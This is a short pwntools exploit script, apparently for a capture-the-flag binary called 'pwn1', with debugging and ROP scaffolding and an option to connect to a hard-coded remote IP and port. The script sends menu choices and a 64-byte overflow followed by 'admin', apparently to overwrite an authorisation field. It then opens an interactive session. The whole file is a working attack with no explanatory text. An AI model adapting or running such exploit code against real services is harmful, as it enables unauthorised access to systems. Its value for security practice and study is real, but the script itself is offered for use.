#!/usr/bin/python3

from pwn import *

exe = ELF('pwn1', checksec=False)
# libc = ELF('0', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*0x40099B
        

                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('207.148.79.171', 2502)
else:
        p = process(exe.path)

GDB()
sla(b'Exit', b'2')
sla(b':', b'a'*8)
sla(b':', b'a'*64 + b'admin')
sla(b'Exit', b'4')

p.interactive()
